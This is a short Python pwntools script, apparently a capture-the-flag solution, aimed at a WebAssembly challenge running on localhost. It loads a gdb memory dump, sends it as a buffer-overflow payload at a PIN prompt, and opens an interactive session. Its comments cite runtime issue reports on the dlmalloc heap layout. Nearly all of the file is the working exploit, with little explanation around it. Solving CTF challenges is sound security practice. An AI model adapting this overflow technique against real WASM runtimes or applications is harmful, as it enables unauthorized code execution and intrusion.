from pwn import *
import os

# p = process(["wasmtime", "--dir", "./", "./chall"])
p = remote("localhost", 30212)

# (gdb) dump memory out.bin 0x7ffe779fb2d1 0x7ffe779fb7e0
lol = open("./out.bin", "rb").read().replace(b"\n", b"\x00")

# simple buffer overflow, but not to overwrite the global dlmalloc structures
# https://github.com/WebAssembly/wasi-libc/issues/233
# https://github.com/bytecodealliance/wasm-micro-runtime/issues/539#issuecomment-784229600
p.sendlineafter(b"PIN:", b"\x00" + lol)

p.interactive()
